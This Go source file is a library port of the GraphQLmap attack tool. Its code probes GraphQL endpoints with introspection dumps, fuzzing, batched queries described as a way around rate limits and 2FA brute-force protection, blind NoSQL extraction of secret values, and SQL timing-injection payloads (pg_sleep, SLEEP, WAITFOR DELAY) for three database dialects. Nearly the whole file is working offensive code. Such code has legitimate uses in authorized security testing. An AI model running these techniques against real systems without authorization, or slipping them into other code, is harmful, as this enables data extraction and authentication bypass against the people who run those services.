// Package graphqlmap is a library port of GraphQLmap (swisskyrepo/GraphQLmap, MIT).
//
// It is a library, not a tool: nothing here prints, every technique returns a structured
// result, and the send path is an injectable Transport so a caller can route probes through
// its own egress chokepoint instead of a package-level http.Client.
//
// # Ported techniques
//
//	Introspect     <- dump_schema        (both the >14 and legacy introspection documents)
//	Execute        <- exec_graphql
//	FuzzCharset    <- GRAPHQL_CHARSET
//	FuzzIncrement  <- GRAPHQL_INCREMENT_<n>
//	Batch          <- BATCHING_<n>       (JSON array of {"query":...}, as utils.requester sends)
//	BlindExtract   <- blind_nosql
//	TimingProbe    <- blind_postgresql / blind_mysql / blind_mssql
//
// # Deliberate divergences from the Python, and why
//
//   - blind_nosql appends *every* charset character whose response matches the check string
//     within one pass, because its inner loop has no break. Two matching characters therefore
//     both land in the extracted value, in charset order rather than in the order the data
//     actually has them. BlindExtract stops at the first match per position.
//   - blind_postgresql / blind_mysql / blind_mssql print a start and end timestamp and leave
//     the operator to eyeball the difference. TimingProbe measures against a clean baseline
//     and returns a verdict, so "the endpoint is always slow" cannot read as a finding.
//   - exec_advanced compares nothing: it prints each response length. FuzzCharset and
//     FuzzIncrement capture an unmutated baseline first and mark a result Interesting only
//     relative to it.
//   - The Go port (Chaim12345/graphqlmap-go) takes its baseline from the *first payload's*
//     response, so every payload is compared against another payload. Baseline() here is
//     always the untouched query.
package graphqlmap

import (
	"bytes"
	"context"
	"encoding/json"
	"errors"
	"fmt"
	"net/url"
	"strconv"
	"strings"
	"time"
)

// Placeholder tokens, spelled as the Python tool spells them so existing GraphQLmap
// query snippets work unchanged.
const (
	TokenCharset      = "GRAPHQL_CHARSET"
	TokenIncrement    = "GRAPHQL_INCREMENT_"
	TokenBatching     = "BATCHING_"
	TokenBlind        = "BLIND_PLACEHOLDER"
	DefaultCharset    = "abcdefghijklmnopqrstuvwxyz1234567890"
	FuzzCharsetFull   = "!$%'()*+,-./0123456789:;<=>?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[]^_`abcdefghijklmnopqrstuvwxyz{|}~"
	DefaultMaxExtract = 128
)

// Encoding selects how a query is carried.
type Encoding int

const (
	// EncodingJSON posts {"query": "..."} as application/json.
	EncodingJSON Encoding = iota
	// EncodingForm posts query=... as a urlencoded body, which is what the Python tool
	// does when --json is absent but the method is POST.
	EncodingForm
	// EncodingGet puts the query in a ?query= parameter.
	EncodingGet
)

// Request is one outbound GraphQL call.
type Request struct {
	Method   string
	URL      string
	Headers  map[string]string
	Body     []byte
	Encoding Encoding
	// BatchSize is 0 for a single query, or the number of copies in a batch array.
	BatchSize int
}

// Response is one inbound answer. Data and Errors are decoded when the body is a GraphQL
// envelope; Body always holds the raw bytes.
type Response struct {
	Status   int
	Body     []byte
	Duration time.Duration
	Data     json.RawMessage
	Errors   []GraphQLError
}

// GraphQLError is one entry of a GraphQL `errors` array.
type GraphQLError struct {
	Message string         `json:"message"`
	Path    []any          `json:"path,omitempty"`
	Ext     map[string]any `json:"extensions,omitempty"`
}

// HasErrors reports whether the envelope carried a non-empty errors array.
func (r *Response) HasErrors() bool { return r != nil && len(r.Errors) > 0 }

// ErrorMessages flattens the error messages, for signature matching.
func (r *Response) ErrorMessages() []string {
	if r == nil {
		return nil
	}
	out := make([]string, 0, len(r.Errors))
	for _, e := range r.Errors {
		out = append(out, e.Message)
	}
	return out
}

// DataLen is the length the Python tool compares on (`only_length`): the size of the decoded
// data document, falling back to the whole body when there is no envelope.
func (r *Response) DataLen() int {
	if r == nil {
		return 0
	}
	if len(r.Data) > 0 {
		return len(r.Data)
	}
	return len(r.Body)
}

// Transport sends one request. Implementations decide egress policy; this package never
// dials on its own.
type Transport interface {
	Do(ctx context.Context, req Request) (*Response, error)
}

// Client is a configured endpoint plus its transport.
type Client struct {
	endpoint  string
	transport Transport
	method    string
	encoding  Encoding
	headers   map[string]string
	// timingDelay is what TimingProbe asks the target to sleep for.
	timingDelay time.Duration
	// timingMargin is the fraction of the requested delay that must actually be observed.
	timingMargin float64
	// lengthDelta is how far a response length must move from the baseline to be
	// Interesting. The Python tool has no threshold at all; a fixed one keeps a
	// one-byte timestamp difference from marking every result.
	lengthDelta int
	maxExtract  int
}

// Option configures a Client.
type Option func(*Client)

func WithMethod(m string) Option             { return func(c *Client) { c.method = m } }
func WithEncoding(e Encoding) Option         { return func(c *Client) { c.encoding = e } }
func WithTimingDelay(d time.Duration) Option { return func(c *Client) { c.timingDelay = d } }
func WithLengthDelta(n int) Option           { return func(c *Client) { c.lengthDelta = n } }
func WithMaxExtract(n int) Option            { return func(c *Client) { c.maxExtract = n } }

// WithHeaders copies h into the client's header set.
func WithHeaders(h map[string]string) Option {
	return func(c *Client) {
		if c.headers == nil {
			c.headers = make(map[string]string, len(h))
		}
		for k, v := range h {
			c.headers[k] = v
		}
	}
}

// WithTimingMargin sets the fraction of the requested delay that must be observed. Values
// outside (0,1] are ignored.
func WithTimingMargin(f float64) Option {
	return func(c *Client) {
		if f > 0 && f <= 1 {
			c.timingMargin = f
		}
	}
}

// New builds a client. A nil transport is an error at use time, not a panic here, so a caller
// can construct one from config before deciding whether it will send anything.
func New(endpoint string, t Transport, opts ...Option) *Client {
	c := &Client{
		endpoint:     endpoint,
		transport:    t,
		method:       "POST",
		encoding:     EncodingJSON,
		timingDelay:  10 * time.Second,
		timingMargin: 0.6,
		lengthDelta:  16,
		maxExtract:   DefaultMaxExtract,
	}
	for _, o := range opts {
		o(c)
	}
	return c
}

// Endpoint returns the configured URL.
func (c *Client) Endpoint() string { return c.endpoint }

var errNoTransport = errors.New("graphqlmap: no transport configured")

// encode builds the wire request for a query, mirroring utils.requester.
func (c *Client) encode(query string, batch int) (Request, error) {
	req := Request{Method: c.method, URL: c.endpoint, Encoding: c.encoding, BatchSize: batch,
		Headers: map[string]string{}}
	for k, v := range c.headers {
		req.Headers[k] = v
	}

	// The Python tool stores introspection documents with '+' where spaces belong and
	// substitutes them back before a POST body.
	body := strings.ReplaceAll(query, "+", " ")

	switch {
	case batch > 0:
		// Real batching: a JSON array of query objects. This is the wire shape that makes
		// the batching attack work; joining queries with newlines produces one invalid
		// document instead.
		arr := make([]map[string]string, 0, batch)
		for range batch {
			arr = append(arr, map[string]string{"query": body})
		}
		enc, err := json.Marshal(arr)
		if err != nil {
			return Request{}, err
		}
		req.Method = "POST"
		req.Body = enc
		req.Headers["Content-Type"] = "application/json"
		req.Encoding = EncodingJSON

	case c.encoding == EncodingGet || strings.EqualFold(c.method, "GET"):
		req.Method = "GET"
		req.Encoding = EncodingGet
		sep := "?"
		if strings.Contains(c.endpoint, "?") {
			sep = "&"
		}
		req.URL = c.endpoint + sep + "query=" + url.QueryEscape(body)

	case c.encoding == EncodingForm:
		req.Method = "POST"
		req.Body = []byte("query=" + url.QueryEscape(body))
		req.Headers["Content-Type"] = "application/x-www-form-urlencoded"

	default:
		enc, err := json.Marshal(map[string]string{"query": body})
		if err != nil {
			return Request{}, err
		}
		req.Method = "POST"
		req.Body = enc
		req.Headers["Content-Type"] = "application/json"
	}
	return req, nil
}

// Execute sends one query and decodes the envelope.
func (c *Client) Execute(ctx context.Context, query string) (*Response, error) {
	return c.send(ctx, query, 0)
}

func (c *Client) send(ctx context.Context, query string, batch int) (*Response, error) {
	if c.transport == nil {
		return nil, errNoTransport
	}
	req, err := c.encode(query, batch)
	if err != nil {
		return nil, err
	}
	res, err := c.transport.Do(ctx, req)
	if err != nil {
		return nil, err
	}
	if res == nil {
		return nil, errors.New("graphqlmap: transport returned no response")
	}
	decodeEnvelope(res)
	return res, nil
}

// decodeEnvelope fills Data and Errors when the body is a GraphQL envelope. A body that is
// not one is left alone rather than reported as an error: a REST 404 or an HTML error page is
// a legitimate answer to probe with.
func decodeEnvelope(r *Response) {
	var env struct {
		Data   json.RawMessage `json:"data"`
		Errors []GraphQLError  `json:"errors"`
	}
	if err := json.Unmarshal(r.Body, &env); err != nil {
		return
	}
	r.Data, r.Errors = env.Data, env.Errors
}

// IsGraphQLEnvelope reports whether body looks like a GraphQL response: a JSON object with a
// data or errors member. Used to tell a real endpoint from a 404.
func IsGraphQLEnvelope(body []byte) bool {
	var env map[string]json.RawMessage
	if err := json.Unmarshal(bytes.TrimSpace(body), &env); err != nil {
		return false
	}
	_, hasData := env["data"]
	_, hasErrors := env["errors"]
	return hasData || hasErrors
}

// ---------------------------------------------------------------------------
// fuzzing
// ---------------------------------------------------------------------------

// FuzzResult is one substituted value and what came back.
type FuzzResult struct {
	Input       string
	Query       string
	DataLen     int
	Duration    time.Duration
	Status      int
	Errors      []string
	Err         error
	Interesting bool
	Note        string
}

// FuzzReport is a fuzzing run: its baseline, its results, and how many never landed.
type FuzzReport struct {
	Baseline    *Response
	BaselineLen int
	Results     []FuzzResult
	Interesting []FuzzResult
	// Unsent counts substitutions whose request errored. They are neither clean nor
	// interesting; a caller reporting coverage has to say how many never happened.
	Unsent int
}

// baselineFor runs the query with every placeholder removed, giving a length to compare
// against. This is the step both existing ports skip.
func (c *Client) baselineFor(ctx context.Context, query string, token, inert string) (*Response, error) {
	return c.Execute(ctx, strings.ReplaceAll(query, token, inert))
}

// FuzzCharset substitutes each character of charset for TokenCharset. Empty charset uses
// FuzzCharsetFull, the set attacks.exec_advanced hardcodes.
func (c *Client) FuzzCharset(ctx context.Context, query, charset string) (*FuzzReport, error) {
	if !strings.Contains(query, TokenCharset) {
		return nil, fmt.Errorf("graphqlmap: query contains no %s", TokenCharset)
	}
	if charset == "" {
		charset = FuzzCharsetFull
	}
	base, err := c.baselineFor(ctx, query, TokenCharset, "")
	if err != nil {
		return nil, fmt.Errorf("graphqlmap: no baseline: %w", err)
	}
	rep := &FuzzReport{Baseline: base, BaselineLen: base.DataLen()}
	for _, ch := range charset {
		in := string(ch)
		c.runFuzzOne(ctx, rep, query, TokenCharset, in, in)
	}
	return rep, nil
}

// FuzzIncrement substitutes 0..upTo-1 for TokenIncrement+<upTo>. When upTo is 0 the bound is
// read from the token itself, as GRAPHQL_INCREMENT_10 does in the Python tool.
func (c *Client) FuzzIncrement(ctx context.Context, query string, upTo int) (*FuzzReport, error) {
	token, bound, ok := parseIncrementToken(query)
	if !ok {
		return nil, fmt.Errorf("graphqlmap: query contains no %s<n>", TokenIncrement)
	}
	if upTo > 0 {
		bound = upTo
	}
	if bound <= 0 {
		return nil, fmt.Errorf("graphqlmap: increment bound must be positive, got %d", bound)
	}
	base, err := c.baselineFor(ctx, query, token, "0")
	if err != nil {
		return nil, fmt.Errorf("graphqlmap: no baseline: %w", err)
	}
	rep := &FuzzReport{Baseline: base, BaselineLen: base.DataLen()}
	for i := range bound {
		in := strconv.Itoa(i)
		c.runFuzzOne(ctx, rep, query, token, in, in)
	}
	return rep, nil
}

// parseIncrementToken finds GRAPHQL_INCREMENT_<n> and returns the whole token and its bound.
func parseIncrementToken(query string) (token string, bound int, ok bool) {
	i := strings.Index(query, TokenIncrement)
	if i < 0 {
		return "", 0, false
	}
	rest := query[i+len(TokenIncrement):]
	end := 0
	for end < len(rest) && rest[end] >= '0' && rest[end] <= '9' {
		end++
	}
	if end == 0 {
		return TokenIncrement, 0, true
	}
	n, err := strconv.Atoi(rest[:end])
	if err != nil {
		return TokenIncrement, 0, true
	}
	return TokenIncrement + rest[:end], n, true
}

func (c *Client) runFuzzOne(ctx context.Context, rep *FuzzReport, query, token, input, shown string) {
	q := strings.ReplaceAll(query, token, input)
	res, err := c.Execute(ctx, q)
	fr := FuzzResult{Input: shown, Query: q}
	if err != nil {
		fr.Err = err
		fr.Note = "request failed: " + err.Error()
		rep.Unsent++
		rep.Results = append(rep.Results, fr)
		return
	}
	fr.DataLen, fr.Duration, fr.Status = res.DataLen(), res.Duration, res.Status
	fr.Errors = res.ErrorMessages()
	diff := fr.DataLen - rep.BaselineLen
	if diff >= c.lengthDelta || diff <= -c.lengthDelta {
		fr.Interesting = true
		fr.Note = fmt.Sprintf("length %+d vs baseline %d", diff, rep.BaselineLen)
	}
	rep.Results = append(rep.Results, fr)
	if fr.Interesting {
		rep.Interesting = append(rep.Interesting, fr)
	}
}

// ---------------------------------------------------------------------------
// batching
// ---------------------------------------------------------------------------

// BatchReport is the result of a BATCHING_<n> run.
type BatchReport struct {
	Requested int
	// Returned is how many envelopes came back. Equal to Requested means the endpoint
	// honours batching, which is what makes rate limits and 2FA brute-force bypassable.
	Returned int
	Accepted bool
	Response *Response
}

// Batch sends query n times inside one request as a JSON array.
func (c *Client) Batch(ctx context.Context, query string, n int) (*BatchReport, error) {
	if n <= 0 {
		return nil, fmt.Errorf("graphqlmap: batch size must be positive, got %d", n)
	}
	query, n = stripBatchToken(query, n)
	res, err := c.send(ctx, query, n)
	if err != nil {
		return nil, err
	}
	var arr []json.RawMessage
	_ = json.Unmarshal(bytes.TrimSpace(res.Body), &arr)
	return &BatchReport{Requested: n, Returned: len(arr), Accepted: len(arr) == n, Response: res}, nil
}

// stripBatchToken removes a BATCHING_<n> prefix and lets it override n, as the Python tool's
// exec_advanced does.
func stripBatchToken(query string, n int) (string, int) {
	i := strings.Index(query, TokenBatching)
	if i < 0 {
		return query, n
	}
	rest := query[i+len(TokenBatching):]
	end := 0
	for end < len(rest) && rest[end] >= '0' && rest[end] <= '9' {
		end++
	}
	if end > 0 {
		if parsed, err := strconv.Atoi(rest[:end]); err == nil && parsed > 0 {
			n = parsed
		}
	}
	return strings.TrimSpace(query[:i] + rest[end:]), n
}

// ---------------------------------------------------------------------------
// blind extraction
// ---------------------------------------------------------------------------

// ExtractSpec describes a blind_nosql run.
type ExtractSpec struct {
	// Query contains TokenBlind where the growing prefix is substituted.
	Query string
	// Check is a string whose presence in the response means the prefix still matches.
	Check string
	// Charset defaults to DefaultCharset.
	Charset string
}

// ExtractReport is what BlindExtract recovered.
type ExtractReport struct {
	Value string
	// Complete is true when a pass added no character, meaning the value ended rather
	// than the budget running out.
	Complete bool
	Requests int
	// Truncated is true when MaxExtract stopped the walk. The value is a prefix, and
	// saying so is the difference between "this is the secret" and "this is as far as we
	// got".
	Truncated bool
}

// BlindExtract walks Charset one position at a time, keeping the character whose response
// still contains Check.
//
// Unlike the Python original this stops at the first matching character per position. The
// original keeps scanning and appends every match in one pass, so two viable characters both
// enter the value in charset order rather than the order the data has them.
func (c *Client) BlindExtract(ctx context.Context, spec ExtractSpec) (*ExtractReport, error) {
	if !strings.Contains(spec.Query, TokenBlind) {
		return nil, fmt.Errorf("graphqlmap: query contains no %s", TokenBlind)
	}
	if spec.Check == "" {
		return nil, errors.New("graphqlmap: a check string is required; without one every response looks like a match")
	}
	charset := spec.Charset
	if charset == "" {
		charset = DefaultCharset
	}
	rep := &ExtractReport{}
	for len(rep.Value) < c.maxExtract {
		grew := false
		for _, ch := range charset {
			if err := ctx.Err(); err != nil {
				return rep, err
			}
			candidate := rep.Value + string(ch)
			res, err := c.Execute(ctx, strings.ReplaceAll(spec.Query, TokenBlind, candidate))
			rep.Requests++
			if err != nil {
				continue
			}
			if bytes.Contains(res.Body, []byte(spec.Check)) {
				rep.Value = candidate
				grew = true
				break
			}
		}
		if !grew {
			rep.Complete = true
			return rep, nil
		}
	}
	rep.Truncated = true
	return rep, nil
}

// ---------------------------------------------------------------------------
// timing probes
// ---------------------------------------------------------------------------

// Dialect names a SQL back end with a sleep primitive.
type Dialect string

const (
	PostgreSQL Dialect = "postgresql"
	MySQL      Dialect = "mysql"
	MSSQL      Dialect = "mssql"
)

// TimingPayload renders the sleep payload for a dialect. The three payload shapes are the
// ones attacks.blind_postgresql / blind_mysql / blind_mssql use, with the hardcoded 30
// seconds parameterised.
func TimingPayload(d Dialect, delay time.Duration) (string, error) {
	secs := int(delay.Seconds())
	if secs <= 0 {
		return "", fmt.Errorf("graphqlmap: delay must be at least a second, got %s", delay)
	}
	switch d {
	case PostgreSQL:
		return fmt.Sprintf("1 AND pg_sleep(%d) --", secs), nil
	case MySQL:
		return fmt.Sprintf("'-SLEEP(%d); #", secs), nil
	case MSSQL:
		return fmt.Sprintf("'; WAITFOR DELAY '00:00:%02d';", secs), nil
	}
	return "", fmt.Errorf("graphqlmap: unknown dialect %q", d)
}

// TimingVerdict keeps "not injectable" apart from "could not tell".
type TimingVerdict int

const (
	TimingNoDelay TimingVerdict = iota
	TimingDelayObserved
	// TimingInconclusive means the baseline was already slow relative to the requested
	// delay, so the two cannot be told apart.
	TimingInconclusive
)

func (v TimingVerdict) String() string {
	switch v {
	case TimingNoDelay:
		return "no delay observed"
	case TimingDelayObserved:
		return "controllable delay observed"
	case TimingInconclusive:
		return "inconclusive: baseline too slow to distinguish"
	}
	return "unknown"
}

// TimingReport is one dialect's timing probe.
type TimingReport struct {
	Dialect  Dialect
	Payload  string
	Baseline time.Duration
	Injected time.Duration
	Verdict  TimingVerdict
}

// TimingProbe substitutes a dialect's sleep payload for TokenBlind and compares the round
// trip against a clean baseline.
func (c *Client) TimingProbe(ctx context.Context, query string, d Dialect) (*TimingReport, error) {
	if !strings.Contains(query, TokenBlind) {
		return nil, fmt.Errorf("graphqlmap: query contains no %s", TokenBlind)
	}
	payload, err := TimingPayload(d, c.timingDelay)
	if err != nil {
		return nil, err
	}
	base, err := c.baselineFor(ctx, query, TokenBlind, "1")
	if err != nil {
		return nil, fmt.Errorf("graphqlmap: no baseline: %w", err)
	}
	rep := &TimingReport{Dialect: d, Payload: payload, Baseline: base.Duration}

	// A baseline already past half the requested delay makes the comparison meaningless.
	if base.Duration >= time.Duration(float64(c.timingDelay)*0.5) {
		rep.Verdict = TimingInconclusive
		return rep, nil
	}
	res, err := c.Execute(ctx, strings.ReplaceAll(query, TokenBlind, payload))
	if err != nil {
		return nil, err
	}
	rep.Injected = res.Duration
	if res.Duration-base.Duration >= time.Duration(float64(c.timingDelay)*c.timingMargin) {
		rep.Verdict = TimingDelayObserved
	}
	return rep, nil
}
